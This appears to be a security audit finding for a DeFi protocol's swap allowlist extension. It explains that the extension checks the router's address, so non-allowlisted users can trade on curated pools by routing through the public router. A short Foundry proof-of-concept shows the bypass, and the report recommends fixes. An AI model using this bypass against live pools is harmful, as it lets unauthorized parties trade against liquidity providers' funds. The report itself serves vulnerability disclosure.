### Title
`SwapAllowlistExtension` Checks Router Address Instead of Actual Swapper, Allowing Full Allowlist Bypass via `MetricOmmSimpleRouter` - (`metric-periphery/contracts/extensions/SwapAllowlistExtension.sol`)

---

### Summary

`SwapAllowlistExtension.beforeSwap` gates swaps by checking the `sender` argument, which the pool sets to `msg.sender` of the `pool.swap()` call. When a user routes through `MetricOmmSimpleRouter`, the pool's `msg.sender` is the router contract, not the original user. If the pool admin allowlists the router (the only way to let legitimate users use the standard periphery), every unpermissioned address can bypass the allowlist by routing through the public router.

---

### Finding Description

**Call chain:**

```
User (non-allowlisted)
  → MetricOmmSimpleRouter.exactInputSingle(params)
      → IMetricOmmPoolActions(params.pool).swap(recipient, zeroForOne, ..., extensionData)
          // msg.sender at pool level = address(router)
          → MetricOmmPool._beforeSwap(msg.sender=router, ...)
              → SwapAllowlistExtension.beforeSwap(sender=router, ...)
                  // checks allowedSwapper[pool][router], NOT allowedSwapper[pool][user]
```

In `MetricOmmPool.swap`, the pool passes `msg.sender` as the `sender` argument to `_beforeSwap`:

```solidity
_beforeSwap(
    msg.sender,   // ← router address when called via router
    recipient,
    ...
);
```

`SwapAllowlistExtension.beforeSwap` then checks:

```solidity
if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
    revert IMetricOmmPoolActions.NotAllowedToSwap();
}
```

where `msg.sender` is the pool and `sender` is the router. The check resolves to `allowedSwapper[pool][router]`, not `allowedSwapper[pool][actual_user]`.

**The dilemma this creates for pool admins:**

- If the router is **not** allowlisted: legitimate allowlisted users cannot use the standard periphery at all — broken core functionality.
- If the router **is** allowlisted (the only way to enable the periphery): every non-allowlisted address can bypass the allowlist by calling `router.exactInputSingle` / `exactInput` / `exactOutputSingle` / `exactOutput` — the allowlist is completely defeated.

The same bypass applies to all four router entry points since all of them call `pool.swap()` directly with the router as `msg.sender`.

---

### Impact Explanation

**Direct loss of curation policy and potential fund impact:** Pools using `SwapAllowlistExtension` are typically curated (KYC-gated, institutional-only, or restricted-counterparty). A non-allowlisted attacker who routes through the public router can execute swaps against the pool's LP reserves at oracle prices, extracting value from LPs who deposited under the assumption that only vetted counterparties could trade. This is a direct loss of LP principal through unauthorized swap execution — matching the "broken core pool functionality causing loss of funds" and "admin-boundary break: factory/oracle role checks are bypassed by an unprivileged path" impact categories.

---

### Likelihood Explanation

**High.** `MetricOmmSimpleRouter` is the standard, documented periphery entry point for swaps. Any pool admin who wants allowlisted users to be able to use the router must allowlist the router address, which simultaneously opens the bypass to all users. The attack requires no special privileges, no flash loans, and no oracle manipulation — only a call to a public function.

---

### Recommendation

The extension must resolve the original transaction initiator, not the immediate caller of `pool.swap()`. Two viable approaches:

1. **Pass the original initiator explicitly:** Modify the router to forward the original `msg.sender` in `extensionData`, and update `SwapAllowlistExtension.beforeSwap` to decode and check that address instead of `sender`.

2. **Check `recipient` or use a dedicated field:** Redesign the hook interface to carry a separate `originator` field that the pool populates from a trusted source (e.g., a transient context set by the router before calling the pool), so the extension always sees the economic actor, not the intermediary.

The simplest production fix is approach (1): the router encodes `msg.sender` into `extensionData` before calling the pool, and the extension decodes it. This requires no core pool changes.

---

### Proof of Concept

```solidity
// Setup: pool with SwapAllowlistExtension; only `allowedUser` is allowlisted.
// Pool admin also allowlists the router so allowedUser can use the periphery.
swapExtension.setAllowedToSwap(address(pool), allowedUser, true);
swapExtension.setAllowedToSwap(address(pool), address(router), true); // required for periphery

// Attack: attacker (not allowlisted) bypasses the guard via the router.
vm.startPrank(attacker); // attacker NOT in allowedSwapper[pool]
token1.approve(address(router), type(uint256).max);

// Direct call to pool.swap() would revert: allowedSwapper[pool][attacker] == false
// But routing through the router passes: allowedSwapper[pool][router] == true
router.exactInputSingle(
    IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool:            address(pool),
        tokenIn:         address(token1),
        tokenOut:        address(token0),
        zeroForOne:      false,
        amountIn:        1_000,
        amountOutMinimum: 0,
        recipient:       attacker,
        deadline:        block.timestamp + 1,
        priceLimitX64:   type(uint128).max,
        extensionData:   ""
    })
);
// Swap succeeds — attacker traded on a curated pool without being allowlisted.
```

**Relevant code locations:**

`SwapAllowlistExtension.beforeSwap` — the guard that checks the wrong actor: [1](#0-0) 

`MetricOmmPool.swap` — passes `msg.sender` (the router) as `sender` to the hook: [2](#0-1) 

`MetricOmmSimpleRouter.exactInputSingle` — calls `pool.swap()` directly, making the router the pool's `msg.sender`: [3](#0-2) 

`ExtensionCalling._beforeSwap` — forwards `sender` (= router) unchanged to the extension: [4](#0-3)

### Citations

**File:** metric-periphery/contracts/extensions/SwapAllowlistExtension.sol (L31-41)
```text
  function beforeSwap(address sender, address, bool, int128, uint128, uint256, uint128, uint128, bytes calldata)
    external
    view
    override
    returns (bytes4)
  {
    if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
      revert IMetricOmmPoolActions.NotAllowedToSwap();
    }
    return IMetricOmmExtensions.beforeSwap.selector;
  }
```

**File:** metric-core/contracts/MetricOmmPool.sol (L230-240)
```text
    _beforeSwap(
      msg.sender,
      recipient,
      zeroForOne,
      amountSpecified,
      priceLimitX64,
      packedSlot0Initial,
      bidPriceX64,
      askPriceX64,
      extensionData
    );
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L71-80)
```text
    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
```

**File:** metric-core/contracts/ExtensionCalling.sol (L149-177)
```text
  function _beforeSwap(
    address sender,
    address recipient,
    bool zeroForOne,
    int128 amountSpecified,
    uint128 priceLimitX64,
    uint256 packedSlot0Initial,
    uint128 bidPriceX64,
    uint128 askPriceX64,
    bytes calldata extensionData
  ) internal {
    _callExtensionsInOrder(
      BEFORE_SWAP_ORDER,
      abi.encodeCall(
        IMetricOmmExtensions.beforeSwap,
        (
          sender,
          recipient,
          zeroForOne,
          amountSpecified,
          priceLimitX64,
          packedSlot0Initial,
          bidPriceX64,
          askPriceX64,
          extensionData
        )
      )
    );
  }
```
